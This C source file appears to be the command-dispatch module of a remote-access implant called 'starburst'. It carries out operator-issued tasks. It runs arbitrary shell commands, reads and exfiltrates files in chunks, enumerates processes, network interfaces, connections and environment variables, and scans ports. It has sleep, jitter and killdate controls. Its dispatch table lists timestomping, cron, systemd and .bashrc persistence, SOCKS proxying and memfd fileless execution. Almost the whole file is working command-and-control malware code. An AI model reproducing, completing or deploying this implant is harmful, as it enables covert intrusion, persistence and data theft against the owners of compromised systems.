#include "starburst.h"

/* ================================================================
 *  BASIC COMMANDS
 * ================================================================ */

static void cmd_shell(const char *task_uuid, parser_t *params) {
    char *command = pr_string(params);
    FILE *fp = popen(command, "r");
    if (!fp) {
        queue_response(task_uuid, RSP_ERROR, "popen failed");
        free(command);
        return;
    }
    size_t cap = 4096, len = 0;
    char *buf = (char *)malloc(cap);
    int n;
    while ((n = fread(buf + len, 1, cap - len - 1, fp)) > 0) {
        len += (size_t)n;
        if (len + 1024 > cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
    }
    buf[len] = '\0';
    pclose(fp);
    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf); free(command);
}

static void cmd_ls(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    DIR *d = opendir(path);
    if (!d) {
        char err[256];
        snprintf(err, sizeof(err), "opendir: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(path);
        return;
    }
    size_t cap = 8192, len = 0;
    char *buf = (char *)malloc(cap);
    buf[0] = '\0';

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        struct stat st;
        char fullpath[2048];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, ent->d_name);
        if (stat(fullpath, &st) == 0) {
            char line[512];
            int llen = snprintf(line, sizeof(line), "%c%c%c%c%c%c%c%c%c%c %8ld %s\n",
                S_ISDIR(st.st_mode) ? 'd' : '-',
                st.st_mode & S_IRUSR ? 'r' : '-', st.st_mode & S_IWUSR ? 'w' : '-',
                st.st_mode & S_IXUSR ? 'x' : '-', st.st_mode & S_IRGRP ? 'r' : '-',
                st.st_mode & S_IWGRP ? 'w' : '-', st.st_mode & S_IXGRP ? 'x' : '-',
                st.st_mode & S_IROTH ? 'r' : '-', st.st_mode & S_IWOTH ? 'w' : '-',
                st.st_mode & S_IXOTH ? 'x' : '-',
                (long)st.st_size, ent->d_name);
            if (len + (size_t)llen + 1 > cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
            memcpy(buf + len, line, llen);
            len += (size_t)llen;
        }
    }
    buf[len] = '\0';
    closedir(d);
    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf); free(path);
}

static void cmd_pwd(const char *task_uuid) {
    char cwd[2048];
    if (getcwd(cwd, sizeof(cwd)))
        queue_response(task_uuid, RSP_SUCCESS, cwd);
    else
        queue_response(task_uuid, RSP_ERROR, strerror(errno));
}

static void cmd_cd(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    if (chdir(path) == 0) {
        char cwd[2048];
        getcwd(cwd, sizeof(cwd));
        queue_response(task_uuid, RSP_SUCCESS, cwd);
    } else {
        char err[256];
        snprintf(err, sizeof(err), "chdir: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
    free(path);
}

static const char *static_lookup_user(uid_t uid, char *buf, size_t bufsz) {
    FILE *fp = fopen("/etc/passwd", "r");
    if (!fp) { snprintf(buf, bufsz, "%d", uid); return buf; }
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        char *name = line;
        char *p = strchr(name, ':');
        if (!p) continue;
        *p++ = '\0';
        p = strchr(p, ':');
        if (!p) continue;
        p++;
        if ((uid_t)atoi(p) == uid) {
            fclose(fp);
            strncpy(buf, name, bufsz - 1);
            buf[bufsz - 1] = '\0';
            return buf;
        }
    }
    fclose(fp);
    snprintf(buf, bufsz, "%d", uid);
    return buf;
}

static void cmd_whoami(const char *task_uuid) {
    char name[128];
    static_lookup_user(getuid(), name, sizeof(name));
    char buf[256];
    snprintf(buf, sizeof(buf), "%s (uid=%d)", name, getuid());
    queue_response(task_uuid, RSP_SUCCESS, buf);
}

static void cmd_cat(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    FILE *fp = fopen(path, "r");
    if (!fp) {
        char err[256];
        snprintf(err, sizeof(err), "fopen: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(path);
        return;
    }
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (size > MAX_TLV_SIZE) size = MAX_TLV_SIZE;

    char *buf = (char *)malloc((size_t)size + 1);
    size_t rd = fread(buf, 1, (size_t)size, fp);
    buf[rd] = '\0';
    fclose(fp);
    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf); free(path);
}

static void cmd_env(const char *task_uuid) {
    extern char **environ;
    size_t cap = 8192, len = 0;
    char *buf = (char *)malloc(cap);
    buf[0] = '\0';
    for (char **e = environ; *e; e++) {
        size_t elen = strlen(*e);
        if (len + elen + 2 > cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
        memcpy(buf + len, *e, elen);
        len += elen;
        buf[len++] = '\n';
    }
    buf[len] = '\0';
    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
}

static void cmd_ps(const char *task_uuid) {
    DIR *d = opendir("/proc");
    if (!d) { queue_response(task_uuid, RSP_ERROR, "cannot open /proc"); return; }

    size_t cap = 16384, len = 0;
    char *buf = (char *)malloc(cap);
    int blen = snprintf(buf, cap, "%-8s %-8s %-8s %s\n", "PID", "PPID", "USER", "CMD");
    len = (size_t)blen;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        int pid = atoi(ent->d_name);
        if (pid <= 0) continue;

        char status_path[128], cmdline_path[128];
        snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);

        int ppid = 0, uid = -1;
        char name[256] = "";
        FILE *fp = fopen(status_path, "r");
        if (fp) {
            char line[512];
            while (fgets(line, sizeof(line), fp)) {
                if (strncmp(line, "Name:", 5) == 0) sscanf(line + 5, " %255s", name);
                else if (strncmp(line, "PPid:", 5) == 0) sscanf(line + 5, " %d", &ppid);
                else if (strncmp(line, "Uid:", 4) == 0) sscanf(line + 4, " %d", &uid);
            }
            fclose(fp);
        }

        char cmdline[512] = "";
        fp = fopen(cmdline_path, "r");
        if (fp) {
            int rn = (int)fread(cmdline, 1, sizeof(cmdline) - 1, fp);
            fclose(fp);
            for (int i = 0; i < rn; i++) if (cmdline[i] == '\0') cmdline[i] = ' ';
            cmdline[rn] = '\0';
        }

        char line[1024];
        int ll = snprintf(line, sizeof(line), "%-8d %-8d %-8d %s\n", pid, ppid, uid, cmdline[0] ? cmdline : name);
        if (len + (size_t)ll + 1 > cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
        memcpy(buf + len, line, ll);
        len += (size_t)ll;
    }
    buf[len] = '\0';
    closedir(d);
    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
}

static void cmd_ifconfig(const char *task_uuid) {
    FILE *fp = popen("ip -o addr show 2>/dev/null", "r");
    if (!fp) { queue_response(task_uuid, RSP_ERROR, "failed to run ip addr"); return; }

    size_t cap = 8192, len = 0;
    char *out = (char *)malloc(cap);
    out[0] = '\0';
    char seen[32][32];
    int seen_count = 0;

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        char iface[64] = {0}, family[16] = {0}, addr[128] = {0};
        int idx = 0;
        if (sscanf(line, "%d: %63s %15s %127s", &idx, iface, family, addr) < 4) continue;

        char *bs = strchr(iface, '\\');
        if (bs) *bs = '\0';

        int is_new = 1;
        for (int i = 0; i < seen_count; i++) if (strcmp(seen[i], iface) == 0) { is_new = 0; break; }

        if (is_new && seen_count < 32) {
            strncpy(seen[seen_count++], iface, 31);
            char mac_path[128];
            snprintf(mac_path, sizeof(mac_path), "/sys/class/net/%s/address", iface);
            FILE *mfp = fopen(mac_path, "r");
            char mac[32] = {0};
            if (mfp) { if (fgets(mac, sizeof(mac), mfp)) { char *nl = strchr(mac, '\n'); if (nl) *nl = '\0'; } fclose(mfp); }
            if (len > 0) { if (len + 2 > cap) { cap *= 2; out = (char *)realloc(out, cap); } out[len++] = '\n'; }
            int wrote = snprintf(out + len, cap - len, "%s\nMAC: %s\n", iface, mac);
            len += (size_t)wrote;
        }

        if (strcmp(family, "inet") == 0 || strcmp(family, "inet6") == 0) {
            if (len + 256 > cap) { cap *= 2; out = (char *)realloc(out, cap); }
            int wrote = snprintf(out + len, cap - len, "IP: %s\n", addr);
            len += (size_t)wrote;
        }
    }
    pclose(fp);
    out[len] = '\0';
    queue_response(task_uuid, RSP_SUCCESS, out);
    free(out);
}

static void cmd_mkdir_handler(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    if (mkdir(path, 0755) == 0)
        queue_response(task_uuid, RSP_SUCCESS, path);
    else {
        char err[256]; snprintf(err, sizeof(err), "mkdir: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
    free(path);
}

static void cmd_rm_handler(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    struct stat st;
    int rc;
    if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
        char cmd[2048]; snprintf(cmd, sizeof(cmd), "rm -rf '%s'", path);
        rc = system(cmd);
    } else {
        rc = unlink(path);
    }
    if (rc == 0) queue_response(task_uuid, RSP_SUCCESS, "removed");
    else { char err[256]; snprintf(err, sizeof(err), "rm: %s", strerror(errno)); queue_response(task_uuid, RSP_ERROR, err); }
    free(path);
}

static void cmd_cp_handler(const char *task_uuid, parser_t *params) {
    char *src = pr_string(params);
    char *dst = pr_string(params);
    char cmd[4096]; snprintf(cmd, sizeof(cmd), "cp -r '%s' '%s' 2>&1", src, dst);
    FILE *fp = popen(cmd, "r");
    char out[1024] = "";
    if (fp) { fread(out, 1, sizeof(out) - 1, fp); pclose(fp); }
    queue_response(task_uuid, RSP_SUCCESS, out[0] ? out : "copied");
    free(src); free(dst);
}

static void cmd_mv_handler(const char *task_uuid, parser_t *params) {
    char *src = pr_string(params);
    char *dst = pr_string(params);
    if (rename(src, dst) == 0)
        queue_response(task_uuid, RSP_SUCCESS, "moved");
    else {
        char err[256]; snprintf(err, sizeof(err), "mv: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
    free(src); free(dst);
}

static void cmd_kill_handler(const char *task_uuid, parser_t *params) {
    uint32_t pid = pr_int32(params);
    if (kill((pid_t)pid, SIGKILL) == 0)
        queue_response(task_uuid, RSP_SUCCESS, "killed");
    else {
        char err[256]; snprintf(err, sizeof(err), "kill(%u): %s", pid, strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
}

static void cmd_sleep_handler(const char *task_uuid, parser_t *params) {
    uint32_t interval = pr_int32(params);
    uint32_t jitter = pr_int32(params);
    g_state.sleep_interval = (int)(interval / 1000);
    if (g_state.sleep_interval < 1) g_state.sleep_interval = 1;
    g_state.sleep_jitter = (int)jitter;
    char msg[128];
    snprintf(msg, sizeof(msg), "sleep=%ds jitter=%d%%", g_state.sleep_interval, g_state.sleep_jitter);
    queue_response(task_uuid, RSP_SUCCESS, msg);
}

/* ================================================================
 *  INFO COMMANDS
 * ================================================================ */

static void cmd_localtime(const char *task_uuid) {
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char buf[128];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S %Z", tm_info);
    queue_response(task_uuid, RSP_SUCCESS, buf);
}

static void cmd_uptime_handler(const char *task_uuid) {
    FILE *fp = fopen("/proc/uptime", "r");
    if (!fp) { queue_response(task_uuid, RSP_ERROR, "cannot read /proc/uptime"); return; }
    double up_secs = 0;
    if (fscanf(fp, "%lf", &up_secs) != 1) up_secs = 0;
    fclose(fp);
    int days = (int)(up_secs / 86400);
    int hours = (int)((up_secs - days * 86400) / 3600);
    int mins = (int)((up_secs - days * 86400 - hours * 3600) / 60);
    char buf[128];
    snprintf(buf, sizeof(buf), "%d days, %d hours, %d minutes (%.0f seconds)", days, hours, mins, up_secs);
    queue_response(task_uuid, RSP_SUCCESS, buf);
}

static void cmd_getuid(const char *task_uuid) {
    uid_t uid = getuid(), euid = geteuid();
    gid_t gid = getgid(), egid = getegid();
    char uname[128], euname[128];
    static_lookup_user(uid, uname, sizeof(uname));
    static_lookup_user(euid, euname, sizeof(euname));
    char buf[512];
    int len = snprintf(buf, sizeof(buf),
        "UID:  %d (%s)\nEUID: %d (%s)\nGID:  %d\nEGID: %d",
        uid, uname, euid, euname, gid, egid);
    gid_t groups[64];
    int ngroups = getgroups(64, groups);
    if (ngroups > 0) {
        len += snprintf(buf + len, sizeof(buf) - len, "\nGroups:");
        for (int i = 0; i < ngroups && len < (int)sizeof(buf) - 16; i++)
            len += snprintf(buf + len, sizeof(buf) - len, " %d", groups[i]);
    }
    queue_response(task_uuid, RSP_SUCCESS, buf);
}

static void cmd_config_handler(const char *task_uuid, parser_t *params) {
    uint32_t sleep_ms = pr_int32(params);
    uint32_t jitter = pr_int32(params);
    uint32_t killdate = pr_int32(params);
    char *s1 = pr_string(params); free(s1);
    char *s2 = pr_string(params); free(s2);
    char *s3 = pr_string(params); free(s3);
    char *s4 = pr_string(params); free(s4);

    if (sleep_ms != 0xFFFFFFFF) { g_state.sleep_interval = (int)(sleep_ms / 1000); if (g_state.sleep_interval < 1) g_state.sleep_interval = 1; }
    if (jitter != 0xFFFFFFFF) g_state.sleep_jitter = (int)jitter;
    if (killdate != 0xFFFFFFFF) g_state.killdate = killdate;

    char msg[256];
    snprintf(msg, sizeof(msg), "sleep=%ds jitter=%d%% killdate=%u", g_state.sleep_interval, g_state.sleep_jitter, g_state.killdate);
    queue_response(task_uuid, RSP_SUCCESS, msg);
}

/* ================================================================
 *  NETSTAT
 * ================================================================ */

static void cmd_netstat_handler(const char *task_uuid) {
    size_t cap = 16384, len = 0;
    char *buf = (char *)malloc(cap);
    int blen = snprintf(buf, cap, "%-6s %-23s %-23s %-12s %-8s\n", "Proto", "Local Address", "Remote Address", "State", "PID");
    len = (size_t)blen;

    const char *tcp_states[] = { "", "ESTABLISHED", "SYN_SENT", "SYN_RECV", "FIN_WAIT1", "FIN_WAIT2",
        "TIME_WAIT", "CLOSE", "CLOSE_WAIT", "LAST_ACK", "LISTEN", "CLOSING" };
    const char *paths[] = { "/proc/net/tcp", "/proc/net/tcp6", "/proc/net/udp", "/proc/net/udp6", NULL };
    const char *protos[] = { "tcp", "tcp6", "udp", "udp6" };

    for (int pi = 0; paths[pi]; pi++) {
        FILE *fp = fopen(paths[pi], "r");
        if (!fp) continue;
        char line[512];
        fgets(line, sizeof(line), fp);
        while (fgets(line, sizeof(line), fp)) {
            unsigned int local_addr, remote_addr, state;
            unsigned short local_port, remote_port;
            unsigned long inode;
            int sl;
            unsigned long tx_q, rx_q, timer_exp, retr;
            unsigned int uid_val;
            if (sscanf(line, " %d: %X:%hX %X:%hX %X %lX:%lX %lX:%lX %*X %u %*d %lu",
                       &sl, &local_addr, &local_port, &remote_addr, &remote_port,
                       &state, &tx_q, &rx_q, &timer_exp, &retr, &uid_val, &inode) < 10)
                continue;
            if (pi >= 2 && state == 7) state = 7;

            char local_str[48], remote_str[48];
            unsigned char *la = (unsigned char *)&local_addr, *ra = (unsigned char *)&remote_addr;
            snprintf(local_str, sizeof(local_str), "%u.%u.%u.%u:%u", la[0], la[1], la[2], la[3], local_port);
            snprintf(remote_str, sizeof(remote_str), "%u.%u.%u.%u:%u", ra[0], ra[1], ra[2], ra[3], remote_port);
            const char *state_str = (state < 12) ? tcp_states[state] : "?";

            char entry[256];
            int elen = snprintf(entry, sizeof(entry), "%-6s %-23s %-23s %-12s\n", protos[pi], local_str, remote_str, state_str);
            if (len + (size_t)elen + 1 > cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
            memcpy(buf + len, entry, elen);
            len += (size_t)elen;
        }
        fclose(fp);
    }
    buf[len] = '\0';
    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
}

/* ================================================================
 *  PORTSCAN
 * ================================================================ */

static void cmd_portscan_handler(const char *task_uuid, parser_t *params) {
    char *hosts_str = pr_string(params);
    char *ports_str = pr_string(params);
    uint32_t timeout_ms = pr_int32(params);
    if (timeout_ms == 0) timeout_ms = 1000;

    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    size_t cap = 8192, len = 0;
    char *buf = (char *)malloc(cap);
    buf[0] = '\0';

    char *hosts_copy = strdup(hosts_str);
    char *host_tok = strtok(hosts_copy, ",; \t\n");
    while (host_tok) {
        while (*host_tok == ' ') host_tok++;
        char *ports_copy = strdup(ports_str);
        char *port_tok = strtok(ports_copy, ",; \t\n");
        while (port_tok) {
            while (*port_tok == ' ') port_tok++;
            int port_start = 0, port_end = 0;
            char *dash = strchr(port_tok, '-');
            if (dash) { *dash = '\0'; port_start = atoi(port_tok); port_end = atoi(dash + 1); }
            else { port_start = port_end = atoi(port_tok); }

            for (int port = port_start; port <= port_end; port++) {
                struct addrinfo hints = {0}, *res = NULL;
                hints.ai_family = AF_INET;
                hints.ai_socktype = SOCK_STREAM;
                char port_s[8]; snprintf(port_s, sizeof(port_s), "%d", port);
                if (getaddrinfo(host_tok, port_s, &hints, &res) != 0 || !res) continue;

                int fd = socket(res->ai_family, SOCK_STREAM, 0);
                if (fd < 0) { freeaddrinfo(res); continue; }

                int flags = fcntl(fd, F_GETFL, 0);
                fcntl(fd, F_SETFL, flags | O_NONBLOCK);

                int rc = connect(fd, res->ai_addr, res->ai_addrlen);
                if (rc < 0 && errno == EINPROGRESS) {
                    fd_set wfds; FD_ZERO(&wfds); FD_SET(fd, &wfds);
                    struct timeval to = tv;
                    rc = select(fd + 1, NULL, &wfds, NULL, &to);
                    if (rc > 0) { int err = 0; socklen_t errlen = sizeof(err); getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &errlen); rc = (err == 0) ? 0 : -1; }
                    else rc = -1;
                }

                if (rc == 0) {
                    char line[128];
                    int ll = snprintf(line, sizeof(line), "%s:%d open\n", host_tok, port);
                    if (len + (size_t)ll + 1 > cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
                    memcpy(buf + len, line, ll);
                    len += (size_t)ll;
                }
                close(fd); freeaddrinfo(res);
            }
            port_tok = strtok(NULL, ",; \t\n");
        }
        free(ports_copy);
        host_tok = strtok(NULL, ",; \t\n");
    }
    free(hosts_copy);
    buf[len] = '\0';
    queue_response(task_uuid, RSP_SUCCESS, len ? buf : "no open ports found");
    free(buf); free(hosts_str); free(ports_str);
}

/* ================================================================
 *  FILE TRANSFER
 * ================================================================ */

static void cmd_upload_handler(const char *task_uuid, parser_t *params) {
    char *file_id = pr_string(params);
    char *remote_path = pr_string(params);
    uint32_t total_chunks = pr_int32(params);
    uint32_t chunk_num = pr_int32(params);
    uint32_t chunk_len;
    const uint8_t *chunk_data = pr_bytes(params, &chunk_len);

    FILE *fp = (chunk_num == 1) ? fopen(remote_path, "wb") : fopen(remote_path, "ab");
    if (!fp) {
        char err[512]; snprintf(err, sizeof(err), "fopen(%s): %s", remote_path, strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(file_id); free(remote_path); return;
    }
    if (chunk_data && chunk_len > 0) fwrite(chunk_data, 1, chunk_len, fp);
    fclose(fp);

    if (chunk_num >= total_chunks) {
        char msg[512]; snprintf(msg, sizeof(msg), "uploaded %s (%u chunks)", remote_path, total_chunks);
        queue_response(task_uuid, RSP_SUCCESS, msg);
    } else {
        packer_t p; pk_init(&p);
        pk_byte(&p, ACTION_POST_RESPONSE);
        pk_string(&p, task_uuid);
        pk_byte(&p, RSP_PROCESSING);
        pk_byte(&p, UPLOAD_REQUEST);
        pk_string(&p, file_id);
        pk_int32(&p, chunk_num + 1);
        pk_string(&p, remote_path);
        pk_int32(&p, total_chunks);
        pthread_mutex_lock(&g_state.rsp_mutex);
        rsp_queue(p.data, p.len);
        pthread_mutex_unlock(&g_state.rsp_mutex);
        pk_free(&p);
    }
    free(file_id); free(remote_path);
}

static void cmd_download_init(const char *task_uuid, parser_t *params) {
    char *filepath = pr_string(params);
    FILE *fp = fopen(filepath, "rb");
    if (!fp) {
        char err[256]; snprintf(err, sizeof(err), "open: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(filepath); return;
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    int slot = -1;
    for (int i = 0; i < MAX_DOWNLOADS; i++) if (!g_state.downloads[i].active) { slot = i; break; }
    if (slot < 0) { fclose(fp); queue_response(task_uuid, RSP_ERROR, "no download slots"); free(filepath); return; }

    download_slot_t *dl = &g_state.downloads[slot];
    memset(dl, 0, sizeof(*dl));
    strncpy(dl->task_uuid, task_uuid, 39);
    strncpy(dl->file_path, filepath, 1023);
    dl->fp = fp; dl->total_size = (uint32_t)fsize; dl->active = 1; dl->awaiting_file_id = 1;

    uint32_t total_chunks = (dl->total_size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    if (total_chunks == 0) total_chunks = 1;

    packer_t p; pk_init(&p);
    pk_byte(&p, ACTION_POST_RESPONSE);
    pk_string(&p, task_uuid);
    pk_byte(&p, RSP_PROCESSING);
    pk_byte(&p, DOWNLOAD_INIT);
    pk_int32(&p, total_chunks);
    pk_int32(&p, dl->total_size);
    pk_string(&p, filepath);

    pthread_mutex_lock(&g_state.rsp_mutex);
    rsp_queue(p.data, p.len);
    pthread_mutex_unlock(&g_state.rsp_mutex);
    pk_free(&p); free(filepath);
}

static void cmd_download_resp(const char *task_uuid, parser_t *params) {
    char *file_id = pr_string(params);
    for (int i = 0; i < MAX_DOWNLOADS; i++) {
        download_slot_t *dl = &g_state.downloads[i];
        if (!dl->active || !dl->awaiting_file_id || strcmp(dl->task_uuid, task_uuid) != 0) continue;

        strncpy(dl->file_id, file_id, 39);
        dl->awaiting_file_id = 0;

        uint8_t *chunk_buf = (uint8_t *)malloc(CHUNK_SIZE);
        uint32_t chunk_num = 1;
        while (dl->sent < dl->total_size) {
            uint32_t to_read = dl->total_size - dl->sent;
            if (to_read > CHUNK_SIZE) to_read = CHUNK_SIZE;
            size_t rd = fread(chunk_buf, 1, to_read, dl->fp);
            if (rd == 0) break;
            int is_last = (dl->sent + (uint32_t)rd >= dl->total_size);

            packer_t p; pk_init(&p);
            pk_byte(&p, ACTION_POST_RESPONSE);
            pk_string(&p, task_uuid);
            pk_byte(&p, is_last ? RSP_SUCCESS : RSP_PROCESSING);
            pk_byte(&p, DOWNLOAD_CHUNK);
            pk_int32(&p, chunk_num);
            pk_string(&p, dl->file_id);
            pk_bytes(&p, chunk_buf, (uint32_t)rd);

            pthread_mutex_lock(&g_state.rsp_mutex);
            rsp_queue(p.data, p.len);
            pthread_mutex_unlock(&g_state.rsp_mutex);
            pk_free(&p);
            dl->sent += (uint32_t)rd; chunk_num++;
        }
        free(chunk_buf);
        fclose(dl->fp); dl->fp = NULL; dl->active = 0;
        queue_response(task_uuid, RSP_SUCCESS, "download complete");
        break;
    }
    free(file_id);
}

/* ================================================================
 *  DISPATCH
 * ================================================================ */

#define CMD_JOBKILL 0x29

void dispatch_task(uint8_t cmd_id, const char *task_uuid,
                   const uint8_t *param_data, uint32_t param_len) {
    parser_t params;
    pr_init(&params, param_data, param_len);

    switch (cmd_id) {
        case CMD_EXIT:       queue_response(task_uuid, RSP_SUCCESS, "exiting"); g_state.running = 0; break;
        case CMD_SLEEP:      cmd_sleep_handler(task_uuid, &params); break;
        case CMD_SHELL:
        case CMD_RUN:        cmd_shell(task_uuid, &params); break;
        case CMD_LS:         cmd_ls(task_uuid, &params); break;
        case CMD_CD:         cmd_cd(task_uuid, &params); break;
        case CMD_PWD:        cmd_pwd(task_uuid); break;
        case CMD_WHOAMI:     cmd_whoami(task_uuid); break;
        case CMD_CAT:        cmd_cat(task_uuid, &params); break;
        case CMD_ENV:        cmd_env(task_uuid); break;
        case CMD_PS:         cmd_ps(task_uuid); break;
        case CMD_IFCONFIG:   cmd_ifconfig(task_uuid); break;
        case CMD_MKDIR:      cmd_mkdir_handler(task_uuid, &params); break;
        case CMD_RM:         cmd_rm_handler(task_uuid, &params); break;
        case CMD_CP:         cmd_cp_handler(task_uuid, &params); break;
        case CMD_MV:         cmd_mv_handler(task_uuid, &params); break;
        case CMD_KILL:       cmd_kill_handler(task_uuid, &params); break;
        case CMD_UPLOAD:     cmd_upload_handler(task_uuid, &params); break;
        case CMD_CONFIG:     cmd_config_handler(task_uuid, &params); break;
        case CMD_DOWNLOAD:   cmd_download_init(task_uuid, &params); break;
        case DOWNLOAD_RESP_CMD: cmd_download_resp(task_uuid, &params); break;
        case CMD_NETSTAT:    cmd_netstat_handler(task_uuid); break;
        case CMD_TIMESTOMP:  cmd_timestomp_handler(task_uuid, &params); break;
        case CMD_LOCALTIME:  cmd_localtime(task_uuid); break;
        case CMD_GETUID:     cmd_getuid(task_uuid); break;
        case CMD_UPTIME:     cmd_uptime_handler(task_uuid); break;
        case CMD_RPFWD:      cmd_rpfwd_handler(task_uuid, &params); break;
        case CMD_SOCKS:      cmd_socks_handler(task_uuid, &params); break;
        case CMD_PORTSCAN:   cmd_portscan_handler(task_uuid, &params); break;
        case CMD_CONNECT:    cmd_connect_handler(task_uuid, &params); break;
        case CMD_DISCONNECT: cmd_disconnect_handler(task_uuid, &params); break;
        case CMD_PERSIST_CRON:    cmd_persist_cron(task_uuid, &params); break;
        case CMD_PERSIST_SYSTEMD: cmd_persist_systemd(task_uuid, &params); break;
        case CMD_PERSIST_BASHRC:  cmd_persist_bashrc(task_uuid, &params); break;
        case CMD_MEMFD_EXEC:      cmd_memfd_exec(task_uuid, &params); break;
        case CMD_JOBKILL:    cmd_jobkill_handler(task_uuid, &params); break;
        default: {
            char msg[64]; snprintf(msg, sizeof(msg), "unsupported command: 0x%02x", cmd_id);
            queue_response(task_uuid, RSP_ERROR, msg);
            break;
        }
    }
}
